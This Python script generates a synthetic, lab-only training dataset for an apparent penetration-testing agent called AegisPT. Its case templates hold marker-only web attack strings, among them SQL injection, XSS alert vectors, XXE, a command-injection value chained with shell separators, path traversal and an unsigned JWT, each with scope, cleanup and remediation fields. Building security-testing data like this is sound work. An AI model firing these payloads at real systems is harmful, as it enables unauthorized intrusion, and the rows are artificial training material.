"""Generate a separate lab-only payload capability dataset for AegisPT iter-4.

This dataset family is intentionally separate from:

- ``aegispt_full_coverage_dora_loraplus_unsloth_*``
- ``aegispt_open_corpus_iter3_*``

It teaches controlled payload selection and evidence expectations for authorized
lab assessments. Each row includes preconditions, approval level, target class,
payload family, a safe synthetic lab target, expected evidence, cleanup/stop
rules, and a reportable finding shape.

The dataset does not execute anything. It uses reserved documentation domains,
RFC 5737 addresses, loopback-only lab services, and marker values such as
``AEGISPT_PROOF_*``.
"""

from __future__ import annotations

import argparse
import json
import random
import urllib.parse
from collections import Counter
from collections.abc import Callable
from pathlib import Path
from typing import Any

DEFAULT_OUT_DIR = Path.home() / ".aegispt-tools" / "training"
DEFAULT_PREFIX = "aegispt_payload_capability_iter4"
DEFAULT_COUNTS = {"train": 7200, "eval": 900, "test": 900}
SEED = 20260604

SYSTEM = (
    "You are AegisPT, an authorized penetration-testing agent in a supervised "
    "lab. Return EXACTLY one JSON object with keys: reasoning, tool, args, "
    "payload, preconditions, expected_evidence, cleanup, finding, safety, done. "
    "Use payloads only against the supplied lab target and only when the "
    "preconditions and approval level are satisfied. Never brute-force, deploy "
    "malware, persist access, destroy data, hide activity, or apply a payload to "
    "an out-of-scope target. Prefer the smallest payload that proves the class "
    "and produces reversible evidence."
)

VULN_CLASSES = (
    "sqli_boolean",
    "sqli_union_marker",
    "xss_reflected_marker",
    "xss_stored_marker",
    "ssrf_loopback_probe",
    "xxe_lab_file_read",
    "command_injection_echo",
    "ssti_arithmetic_marker",
    "path_traversal_lab_file",
    "jwt_unsigned_token_lab",
    "idor_object_switch",
    "graphql_introspection",
    "api_mass_assignment",
    "open_redirect_marker",
    "file_upload_benign_polyglot",
)

DOMAINS = {
    "api_mass_assignment": "api",
    "command_injection_echo": "web",
    "file_upload_benign_polyglot": "web",
    "graphql_introspection": "api",
    "idor_object_switch": "api",
    "jwt_unsigned_token_lab": "api",
    "open_redirect_marker": "web",
    "path_traversal_lab_file": "web",
    "sqli_boolean": "web",
    "sqli_union_marker": "web",
    "ssrf_loopback_probe": "web",
    "ssti_arithmetic_marker": "web",
    "xss_reflected_marker": "web",
    "xss_stored_marker": "web",
    "xxe_lab_file_read": "web",
}

SEVERITY = {
    "api_mass_assignment": "high",
    "command_injection_echo": "critical",
    "file_upload_benign_polyglot": "medium",
    "graphql_introspection": "low",
    "idor_object_switch": "high",
    "jwt_unsigned_token_lab": "critical",
    "open_redirect_marker": "medium",
    "path_traversal_lab_file": "high",
    "sqli_boolean": "high",
    "sqli_union_marker": "critical",
    "ssrf_loopback_probe": "high",
    "ssti_arithmetic_marker": "high",
    "xss_reflected_marker": "medium",
    "xss_stored_marker": "high",
    "xxe_lab_file_read": "high",
}

STANDARDS = {
    "api_mass_assignment": ["OWASP API3:2023", "OWASP ASVS 5.1"],
    "command_injection_echo": ["OWASP WSTG-INPV-12", "CWE-78"],
    "file_upload_benign_polyglot": ["OWASP WSTG-BUSL-09", "OWASP ASVS 12.1"],
    "graphql_introspection": ["OWASP API7:2023", "OWASP WSTG-INFO-05"],
    "idor_object_switch": ["OWASP API1:2023", "OWASP ASVS 4.1"],
    "jwt_unsigned_token_lab": ["OWASP ASVS 2.1", "OWASP API2:2023"],
    "open_redirect_marker": ["OWASP WSTG-CLNT-04", "CWE-601"],
    "path_traversal_lab_file": ["OWASP WSTG-ATHZ-01", "CWE-22"],
    "sqli_boolean": ["OWASP WSTG-INPV-05", "CWE-89"],
    "sqli_union_marker": ["OWASP WSTG-INPV-05", "CWE-89"],
    "ssrf_loopback_probe": ["OWASP WSTG-SRVR-10", "CWE-918"],
    "ssti_arithmetic_marker": ["OWASP WSTG-INPV-18", "CWE-1336"],
    "xss_reflected_marker": ["OWASP WSTG-INPV-01", "CWE-79"],
    "xss_stored_marker": ["OWASP WSTG-INPV-02", "CWE-79"],
    "xxe_lab_file_read": ["OWASP WSTG-INPV-07", "CWE-611"],
}


def marker(rng: random.Random) -> str:
    return f"AEGISPT_PROOF_{rng.randint(1000, 9999)}"


def host(rng: random.Random) -> str:
    return f"https://lab-{rng.randint(100, 999)}.example"


def evidence_ref(vuln_class: str, idx: int) -> str:
    return f"payload-{vuln_class}-{idx:05d}"


def assistant_payload(
    *,
    reasoning: str,
    tool: str,
    args: dict[str, Any],
    payload: dict[str, Any],
    preconditions: list[str],
    expected_evidence: dict[str, Any],
    cleanup: list[str],
    finding: dict[str, Any],
    safety: dict[str, Any],
) -> str:
    return json.dumps(
        {
            "args": args,
            "cleanup": cleanup,
            "done": True,
            "expected_evidence": expected_evidence,
            "finding": finding,
            "payload": payload,
            "preconditions": preconditions,
            "reasoning": reasoning,
            "safety": safety,
            "tool": tool,
        },
        sort_keys=True,
    )


def finding(vuln_class: str, ev_ref: str, title: str, impact: str, remediation: str) -> dict[str, Any]:
    return {
        "confidence": "high",
        "evidence_ref": ev_ref,
        "impact": impact,
        "remediation": remediation,
        "severity": SEVERITY[vuln_class],
        "standards": STANDARDS[vuln_class],
        "title": title,
    }


def safety(vuln_class: str, approval: str = "lab_payload_approved") -> dict[str, Any]:
    return {
        "approval_level": approval,
        "blocked_if": [
            "target_not_in_scope",
            "not_lab_or_written_authorization_missing",
            "payload_would_modify_production_data",
        ],
        "dataset_family": DEFAULT_PREFIX,
        "lab_only": True,
        "runtime_execution": False,
        "vulnerability_class": vuln_class,
    }


def row(
    *,
    split: str,
    idx: int,
    vuln_class: str,
    lab_target: str,
    prompt: str,
    assistant_content: str,
    payload_family: str,
) -> dict[str, Any]:
    return {
        "messages": [
            {"role": "system", "content": SYSTEM},
            {"role": "user", "content": prompt},
            {"role": "assistant", "content": assistant_content},
        ],
        "metadata": {
            "case_id": f"payload-{vuln_class}-{split}-{idx:05d}",
            "dataset_family": DEFAULT_PREFIX,
            "domain": DOMAINS[vuln_class],
            "payload_family": payload_family,
            "safety_tags": [
                "lab_only",
                "payload_capability",
                "approval_required",
                "smallest_proof",
                "no_persistence",
                "no_data_destruction",
            ],
            "split": split,
            "vulnerability_class": vuln_class,
        },
    }


def case_sqli_boolean(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/search"
    proof = marker(rng)
    ev = evidence_ref("sqli_boolean", idx)
    payload = "' OR '1'='1' -- "
    prompt = (
        f"Lab target {target} has a synthetic `q` parameter and seeded data with "
        f"marker {proof}. ROE approves a non-destructive SQL injection proof only."
    )
    content = assistant_payload(
        reasoning="Use a boolean SQLi marker to compare result count against a benign baseline without modifying data.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "q", "url": target},
        payload={"family": "boolean_sqli", "value": payload},
        preconditions=["lab target", "read-only endpoint", "baseline response captured"],
        expected_evidence={"baseline_diff": True, "evidence_ref": ev, "marker": proof},
        cleanup=["no cleanup required for read-only GET", "store request and response hashes"],
        finding=finding(
            "sqli_boolean",
            ev,
            "Boolean SQL injection accepted by lab search parameter",
            "An attacker could alter query logic and access unintended records if this pattern exists in production.",
            "Use parameterized queries and add regression tests for boolean SQLi payload families.",
        ),
        safety=safety("sqli_boolean"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="sqli_boolean",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="boolean_sqli",
    )


def case_sqli_union(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/products"
    proof = marker(rng)
    ev = evidence_ref("sqli_union_marker", idx)
    payload = f"' UNION SELECT '{proof}',NULL,NULL -- "
    prompt = (
        f"Lab target {target} has a synthetic `category` parameter. The objective "
        "is to prove UNION-based injection by reflecting a harmless marker only."
    )
    content = assistant_payload(
        reasoning="Select a marker-only UNION probe so evidence is the reflected marker, not data extraction.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "category", "url": target},
        payload={"family": "union_marker_sqli", "value": payload},
        preconditions=["lab target", "column count known from safe discovery", "marker-only proof approved"],
        expected_evidence={"reflected_marker": proof, "evidence_ref": ev},
        cleanup=["no database writes expected", "discard lab session after proof"],
        finding=finding(
            "sqli_union_marker",
            ev,
            "UNION SQL injection reflected a controlled marker",
            "Query composition may allow arbitrary result manipulation or data disclosure.",
            "Replace string-built SQL with parameterized queries and denylist-free query builders.",
        ),
        safety=safety("sqli_union_marker"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="sqli_union_marker",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="union_marker_sqli",
    )


def case_xss_reflected(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/echo"
    proof = marker(rng)
    ev = evidence_ref("xss_reflected_marker", idx)
    payload = f"\"><svg onload=alert('{proof}')>"
    prompt = (
        f"Lab target {target} reflects the `name` parameter. Browser automation is "
        "approved only for marker alert proof; no cookie access or exfiltration."
    )
    content = assistant_payload(
        reasoning="Use a visible marker alert to prove reflected script execution without reading cookies or exfiltrating data.",
        tool="lab_browser_check",
        args={"parameter": "name", "url": target},
        payload={"context": "html_attribute_breakout", "family": "reflected_xss_marker", "value": payload},
        preconditions=["lab target", "browser harness available", "no sensitive session loaded"],
        expected_evidence={"alert_text": proof, "evidence_ref": ev, "screenshot_required": True},
        cleanup=["close isolated browser context", "clear lab cookies"],
        finding=finding(
            "xss_reflected_marker",
            ev,
            "Reflected XSS executes a controlled marker payload",
            "User-controlled input can execute JavaScript in a victim browser context.",
            "Contextually encode output and add CSP as defense-in-depth.",
        ),
        safety=safety("xss_reflected_marker"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="xss_reflected_marker",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="reflected_xss_marker",
    )


def case_xss_stored(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/profile"
    proof = marker(rng)
    ev = evidence_ref("xss_stored_marker", idx)
    payload = f"<img src=x onerror=alert('{proof}')>"
    prompt = (
        f"Lab profile target {target} stores a biography field. ROE approves a "
        "single marker-only stored XSS proof on a synthetic user."
    )
    content = assistant_payload(
        reasoning="Submit a marker-only payload to the synthetic profile and verify it in an isolated browser session.",
        tool="lab_browser_check",
        args={"field": "bio", "method": "POST_THEN_VIEW", "url": target},
        payload={"family": "stored_xss_marker", "value": payload},
        preconditions=["synthetic account", "lab target", "approval for one write to lab profile"],
        expected_evidence={"alert_text": proof, "evidence_ref": ev, "stored_location": "/lab/profile/view"},
        cleanup=["delete synthetic profile content", "clear isolated browser context"],
        finding=finding(
            "xss_stored_marker",
            ev,
            "Stored XSS executes a controlled marker payload",
            "Stored user content can execute JavaScript for later viewers.",
            "Sanitize rich text, contextually encode output, and validate stored content server-side.",
        ),
        safety=safety("xss_stored_marker"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="xss_stored_marker",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="stored_xss_marker",
    )


def case_ssrf(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/fetch"
    proof = marker(rng)
    ev = evidence_ref("ssrf_loopback_probe", idx)
    internal = f"http://127.0.0.1:8081/proof?marker={proof}"
    payload = urllib.parse.quote(internal, safe="")
    prompt = (
        f"Lab target {target} accepts a `url` parameter. A loopback proof server "
        "on 127.0.0.1:8081 is part of the lab. Do not contact cloud metadata IPs."
    )
    content = assistant_payload(
        reasoning="Use the approved loopback proof service and URL-encode the nested URL so the request remains one parameter.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "url", "url": target},
        payload={"decoded": internal, "family": "ssrf_loopback_probe", "value": payload},
        preconditions=["lab loopback proof server running", "no cloud metadata targets", "single request approved"],
        expected_evidence={"evidence_ref": ev, "loopback_service_received_marker": proof},
        cleanup=["stop lab proof server", "retain callback log hash"],
        finding=finding(
            "ssrf_loopback_probe",
            ev,
            "SSRF reached the approved loopback proof service",
            "The server can be induced to make requests to internal network resources.",
            "Enforce outbound allowlists, URL parser hardening, and metadata service protections.",
        ),
        safety=safety("ssrf_loopback_probe"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="ssrf_loopback_probe",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="ssrf_loopback_probe",
    )


def case_xxe(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/xml"
    proof = marker(rng)
    ev = evidence_ref("xxe_lab_file_read", idx)
    payload = (
        "<?xml version=\"1.0\"?>"
        "<!DOCTYPE proof [<!ENTITY xxe SYSTEM \"file:///app/lab-proof.txt\">]>"
        "<proof>&xxe;</proof>"
    )
    prompt = (
        f"Lab XML parser target {target} has a seeded file /app/lab-proof.txt "
        f"containing {proof}. ROE approves reading that file only."
    )
    content = assistant_payload(
        reasoning="Use an XXE entity pointing to the seeded lab proof file only; do not enumerate filesystem paths.",
        tool="lab_http_request",
        args={"content_type": "application/xml", "method": "POST", "url": target},
        payload={"family": "xxe_seeded_file_marker", "value": payload},
        preconditions=["lab parser", "seeded proof file", "no arbitrary file enumeration"],
        expected_evidence={"evidence_ref": ev, "response_contains": proof},
        cleanup=["delete lab proof file if created by fixture", "store parser response hash"],
        finding=finding(
            "xxe_lab_file_read",
            ev,
            "XXE resolved a seeded lab file entity",
            "XML entity resolution may expose local files or internal resources.",
            "Disable external entity resolution and use hardened XML parsers.",
        ),
        safety=safety("xxe_lab_file_read"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="xxe_lab_file_read",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="xxe_seeded_file_marker",
    )


def case_command_injection(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/ping"
    proof = marker(rng)
    ev = evidence_ref("command_injection_echo", idx)
    separator = rng.choice([";", "&&", "|"])
    payload = f"127.0.0.1 {separator} printf {proof}"
    prompt = (
        f"Lab target {target} passes a synthetic host field to a shell. ROE "
        "approves marker echo only; no filesystem, network, or privilege commands."
    )
    content = assistant_payload(
        reasoning="Use the smallest echo-style marker to prove command concatenation without changing system state.",
        tool="lab_http_request",
        args={"field": "host", "method": "POST", "url": target},
        payload={"family": "command_injection_echo_marker", "separator": separator, "value": payload},
        preconditions=["lab target", "echo-only payload approved", "no privileged commands"],
        expected_evidence={"evidence_ref": ev, "stdout_contains": proof},
        cleanup=["no persistent state expected", "store stdout/stderr evidence"],
        finding=finding(
            "command_injection_echo",
            ev,
            "Command injection executed a marker echo in the lab",
            "Unsanitized input may allow operating-system command execution.",
            "Avoid shell invocation, use safe APIs, and strictly validate command arguments.",
        ),
        safety=safety("command_injection_echo"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="command_injection_echo",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="command_injection_echo_marker",
    )


def case_ssti(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/render"
    ev = evidence_ref("ssti_arithmetic_marker", idx)
    a = rng.randint(6, 12)
    b = rng.randint(6, 12)
    payload = "{{" + f"{a}*{b}" + "}}"
    result = str(a * b)
    prompt = (
        f"Lab template target {target} renders a `message` parameter. Use only "
        "arithmetic evaluation proof; no object traversal or file access."
    )
    content = assistant_payload(
        reasoning="Use an arithmetic SSTI marker because it proves template evaluation without accessing objects or files.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "message", "url": target},
        payload={"expected_result": result, "family": "ssti_arithmetic_marker", "value": payload},
        preconditions=["lab target", "rendered response observable", "arithmetic-only proof"],
        expected_evidence={"evidence_ref": ev, "response_contains": result},
        cleanup=["no cleanup required", "store rendered response hash"],
        finding=finding(
            "ssti_arithmetic_marker",
            ev,
            "Template engine evaluated a controlled arithmetic marker",
            "User input is interpreted as template syntax and may permit deeper server-side access.",
            "Separate user data from templates and disable dynamic template rendering of user input.",
        ),
        safety=safety("ssti_arithmetic_marker"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="ssti_arithmetic_marker",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="ssti_arithmetic_marker",
    )


def case_path_traversal(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/download"
    proof = marker(rng)
    ev = evidence_ref("path_traversal_lab_file", idx)
    payload = "../../../../app/lab-proof.txt"
    prompt = (
        f"Lab download target {target} has a `file` parameter and a seeded "
        f"lab-proof.txt containing {proof}. Read only that seeded proof file."
    )
    content = assistant_payload(
        reasoning="Use a traversal payload limited to the seeded lab proof file; do not enumerate directories.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "file", "url": target},
        payload={"family": "path_traversal_seeded_file", "value": payload},
        preconditions=["lab target", "seeded proof file", "no directory enumeration"],
        expected_evidence={"evidence_ref": ev, "response_contains": proof},
        cleanup=["remove seeded file if fixture created it", "store response hash"],
        finding=finding(
            "path_traversal_lab_file",
            ev,
            "Path traversal read a seeded lab proof file",
            "File path input may escape the intended directory and expose server files.",
            "Normalize paths, enforce allowlisted file identifiers, and deny traversal sequences.",
        ),
        safety=safety("path_traversal_lab_file"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="path_traversal_lab_file",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="path_traversal_seeded_file",
    )


def case_jwt_unsigned(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/api/me"
    ev = evidence_ref("jwt_unsigned_token_lab", idx)
    payload = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWJfdXNlciIsInJvbGUiOiJhZG1pbiIsImxhYl9vbmx5Ijp0cnVlfQ."
    prompt = (
        f"Lab API {target} uses a toy JWT fixture. ROE approves one unsigned-token "
        "negative test to confirm the server rejects `alg:none` tokens."
    )
    content = assistant_payload(
        reasoning="Send a toy unsigned JWT once and treat acceptance as a finding; secure rejection is a pass.",
        tool="lab_http_request",
        args={"header": "Authorization", "method": "GET", "url": target},
        payload={"family": "jwt_unsigned_token_lab", "value": f"Bearer {payload}"},
        preconditions=["toy lab JWT fixture", "single negative test approved", "no real identity token"],
        expected_evidence={"accepted_is_finding": True, "evidence_ref": ev, "secure_result": "401_or_403"},
        cleanup=["discard toy token", "clear lab authorization header"],
        finding=finding(
            "jwt_unsigned_token_lab",
            ev,
            "Lab API accepted an unsigned JWT role claim",
            "JWT validation may trust attacker-controlled claims without signature verification.",
            "Enforce allowed algorithms and verify signatures, issuer, audience, and expiry on every request.",
        ),
        safety=safety("jwt_unsigned_token_lab"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="jwt_unsigned_token_lab",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="jwt_unsigned_token_lab",
    )


def case_idor(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/api/orders"
    ev = evidence_ref("idor_object_switch", idx)
    own_id = rng.randint(1000, 2000)
    other_id = own_id + rng.randint(1, 50)
    prompt = (
        f"Lab API {target} has two synthetic tenant records: own id {own_id} and "
        f"other test id {other_id}. ROE approves read-only BOLA/IDOR proof."
    )
    content = assistant_payload(
        reasoning="Switch only between synthetic test object ids and compare authorization behavior without modifying records.",
        tool="lab_http_request",
        args={"method": "GET", "url": f"{target}/{other_id}"},
        payload={"family": "idor_object_id_switch", "own_id": own_id, "value": str(other_id)},
        preconditions=["two synthetic records", "read-only request", "approved low-privilege token"],
        expected_evidence={"evidence_ref": ev, "other_record_status": 200, "tenant_mismatch": True},
        cleanup=["no data modified", "store own-vs-other response comparison"],
        finding=finding(
            "idor_object_switch",
            ev,
            "API returned another synthetic tenant object",
            "Object authorization may allow cross-user or cross-tenant data access.",
            "Enforce object ownership checks server-side and test every object lookup path.",
        ),
        safety=safety("idor_object_switch"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="idor_object_switch",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="idor_object_id_switch",
    )


def case_graphql(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/graphql"
    ev = evidence_ref("graphql_introspection", idx)
    payload = "{__schema{queryType{name}}}"
    prompt = (
        f"Lab GraphQL endpoint {target} allows a single introspection check. "
        "Do not fuzz resolvers or mutate data."
    )
    content = assistant_payload(
        reasoning="Use a minimal introspection query to determine schema exposure without resolver fuzzing.",
        tool="lab_http_request",
        args={"content_type": "application/json", "method": "POST", "url": target},
        payload={"family": "graphql_minimal_introspection", "value": payload},
        preconditions=["lab endpoint", "single introspection query approved", "no mutations"],
        expected_evidence={"evidence_ref": ev, "schema_field_present": "__schema"},
        cleanup=["no cleanup required", "store response hash"],
        finding=finding(
            "graphql_introspection",
            ev,
            "GraphQL schema introspection is enabled in lab environment",
            "Schema exposure helps map available types, fields, and attack surface.",
            "Restrict introspection in production or require authenticated developer roles.",
        ),
        safety=safety("graphql_introspection"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="graphql_introspection",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="graphql_minimal_introspection",
    )


def case_mass_assignment(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/api/profile"
    ev = evidence_ref("api_mass_assignment", idx)
    payload = {"displayName": marker(rng), "role": "admin"}
    prompt = (
        f"Lab API {target} updates a synthetic user profile. ROE approves one "
        "mass-assignment check on a disposable account."
    )
    content = assistant_payload(
        reasoning="Add a privileged field to an otherwise normal synthetic profile update and verify whether the server ignores or accepts it.",
        tool="lab_http_request",
        args={"content_type": "application/json", "method": "PATCH", "url": target},
        payload={"family": "api_mass_assignment_privileged_field", "value": payload},
        preconditions=["disposable lab account", "single write approved", "rollback available"],
        expected_evidence={"evidence_ref": ev, "role_changed_if_vulnerable": True},
        cleanup=["restore disposable profile role", "delete lab account if created"],
        finding=finding(
            "api_mass_assignment",
            ev,
            "API accepted a privileged field during profile update",
            "Clients may assign server-controlled authorization fields.",
            "Use explicit DTO allowlists and ignore or reject server-controlled fields in client input.",
        ),
        safety=safety("api_mass_assignment"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="api_mass_assignment",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="api_mass_assignment_privileged_field",
    )


def case_open_redirect(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/redirect"
    ev = evidence_ref("open_redirect_marker", idx)
    redirect_to = f"https://callback.example.invalid/{marker(rng)}"
    prompt = (
        f"Lab redirect endpoint {target} has a `next` parameter. ROE approves "
        "checking redirect to example.invalid only."
    )
    content = assistant_payload(
        reasoning="Use an inert example.invalid URL as the redirect target to prove validation behavior without sending users elsewhere.",
        tool="lab_http_request",
        args={"method": "GET", "parameter": "next", "url": target},
        payload={"family": "open_redirect_inert_marker", "value": redirect_to},
        preconditions=["lab target", "example.invalid callback only", "do not use phishing domains"],
        expected_evidence={"evidence_ref": ev, "location_header": redirect_to},
        cleanup=["no cleanup required", "store redirect response headers"],
        finding=finding(
            "open_redirect_marker",
            ev,
            "Redirect parameter accepted an external marker URL",
            "Open redirects can support phishing and token leakage chains.",
            "Allowlist internal redirect destinations and validate URL parsing consistently.",
        ),
        safety=safety("open_redirect_marker"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="open_redirect_marker",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="open_redirect_inert_marker",
    )


def case_file_upload(rng: random.Random, split: str, idx: int) -> dict[str, Any]:
    target = f"{host(rng)}/lab/upload"
    proof = marker(rng)
    ev = evidence_ref("file_upload_benign_polyglot", idx)
    payload = f"<svg xmlns=\"http://www.w3.org/2000/svg\"><text>{proof}</text></svg>"
    prompt = (
        f"Lab upload endpoint {target} accepts SVG in a disposable workspace. "
        "ROE approves benign SVG marker upload only; no script or executable file."
    )
    content = assistant_payload(
        reasoning="Upload a benign SVG marker to validate content-type and storage controls without executable content.",
        tool="lab_http_request",
        args={"content_type": "image/svg+xml", "field": "file", "method": "POST", "url": target},
        payload={"family": "benign_svg_upload_marker", "filename": "aegispt-proof.svg", "value": payload},
        preconditions=["disposable lab workspace", "benign marker file only", "delete permission available"],
        expected_evidence={"evidence_ref": ev, "stored_marker": proof},
        cleanup=["delete uploaded proof file", "store upload metadata"],
        finding=finding(
            "file_upload_benign_polyglot",
            ev,
            "Upload workflow stored and served a benign active-content file type",
            "Permissive upload handling may expose users to active content or unsafe file serving paths.",
            "Restrict allowed file types, store uploads outside executable paths, and set safe content disposition.",
        ),
        safety=safety("file_upload_benign_polyglot"),
    )
    return row(
        split=split,
        idx=idx,
        vuln_class="file_upload_benign_polyglot",
        lab_target=target,
        prompt=prompt,
        assistant_content=content,
        payload_family="benign_svg_upload_marker",
    )


TEMPLATES: list[Callable[[random.Random, str, int], dict[str, Any]]] = [
    case_sqli_boolean,
    case_sqli_union,
    case_xss_reflected,
    case_xss_stored,
    case_ssrf,
    case_xxe,
    case_command_injection,
    case_ssti,
    case_path_traversal,
    case_jwt_unsigned,
    case_idor,
    case_graphql,
    case_mass_assignment,
    case_open_redirect,
    case_file_upload,
]


def generate_rows(count: int, *, split: str, seed: int = SEED) -> list[dict[str, Any]]:
    rng = random.Random(seed + sum(ord(ch) for ch in split))
    rows: list[dict[str, Any]] = []
    templates = list(TEMPLATES)
    for idx in range(count):
        if idx % len(templates) == 0:
            rng.shuffle(templates)
        rows.append(templates[idx % len(templates)](rng, split, idx))
    return rows


def validate_rows(rows: list[dict[str, Any]]) -> dict[str, Any]:
    vuln_classes = Counter()
    payload_families = Counter()
    domains = Counter()
    for row_data in rows:
        metadata = row_data["metadata"]
        vuln_class = metadata["vulnerability_class"]
        vuln_classes[vuln_class] += 1
        payload_families[metadata["payload_family"]] += 1
        domains[metadata["domain"]] += 1
        if metadata["dataset_family"] != DEFAULT_PREFIX:
            raise ValueError(f"wrong dataset family in {metadata['case_id']}")
        if [message["role"] for message in row_data["messages"]] != ["system", "user", "assistant"]:
            raise ValueError(f"bad role sequence in {metadata['case_id']}")
        parsed = json.loads(row_data["messages"][-1]["content"])
        required = {
            "args",
            "cleanup",
            "done",
            "expected_evidence",
            "finding",
            "payload",
            "preconditions",
            "reasoning",
            "safety",
            "tool",
        }
        if set(parsed) != required:
            raise ValueError(f"bad assistant schema in {metadata['case_id']}")
        if parsed["safety"].get("lab_only") is not True:
            raise ValueError(f"missing lab_only safety in {metadata['case_id']}")
        if parsed["safety"].get("runtime_execution") is not False:
            raise ValueError(f"runtime execution allowed in {metadata['case_id']}")
        if not parsed["finding"].get("evidence_ref"):
            raise ValueError(f"missing finding evidence in {metadata['case_id']}")
    missing = sorted(set(VULN_CLASSES) - set(vuln_classes))
    if missing:
        raise ValueError(f"missing vuln classes: {missing}")
    return {
        "domains": dict(sorted(domains.items())),
        "payload_families": dict(sorted(payload_families.items())),
        "vulnerability_classes": dict(sorted(vuln_classes.items())),
    }


def write_jsonl(path: Path, rows: list[dict[str, Any]]) -> None:
    with path.open("w", encoding="utf-8") as handle:
        for row_data in rows:
            handle.write(json.dumps(row_data, sort_keys=True) + "\n")


def parse_counts(values: list[str] | None) -> dict[str, int]:
    counts = dict(DEFAULT_COUNTS)
    for value in values or []:
        split, raw_count = value.split("=", 1)
        if split not in counts:
            raise ValueError(f"unknown split {split!r}")
        counts[split] = int(raw_count)
    return counts


def build_dataset(out_dir: Path, prefix: str, counts: dict[str, int], seed: int = SEED) -> dict[str, Any]:
    out_dir.mkdir(parents=True, exist_ok=True)
    manifest: dict[str, Any] = {
        "dataset": prefix,
        "does_not_modify": [
            "aegispt_full_coverage_dora_loraplus_unsloth",
            "aegispt_open_corpus_iter3",
        ],
        "format": "jsonl with messages and metadata columns",
        "policy": {
            "lab_only": True,
            "raw_external_poc_dump": False,
            "runtime_execution": False,
            "train_eval_test_separated": True,
        },
        "seed": seed,
        "splits": {},
    }
    for split, count in counts.items():
        rows = generate_rows(count, split=split, seed=seed)
        stats = validate_rows(rows)
        path = out_dir / f"{prefix}_{split}.jsonl"
        write_jsonl(path, rows)
        manifest["splits"][split] = {"count": count, "path": str(path), "stats": stats}
    manifest_path = out_dir / f"{prefix}_manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return manifest


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out-dir", type=Path, default=DEFAULT_OUT_DIR)
    parser.add_argument("--prefix", default=DEFAULT_PREFIX)
    parser.add_argument("--seed", type=int, default=SEED)
    parser.add_argument("--count", action="append", help="Override split size, e.g. train=1000")
    args = parser.parse_args()
    manifest = build_dataset(
        args.out_dir,
        args.prefix,
        parse_counts(args.count),
        seed=args.seed,
    )
    print(json.dumps(manifest["splits"], indent=2, sort_keys=True))
    print(f"manifest: {args.out_dir / (args.prefix + '_manifest.json')}")


if __name__ == "__main__":
    main()
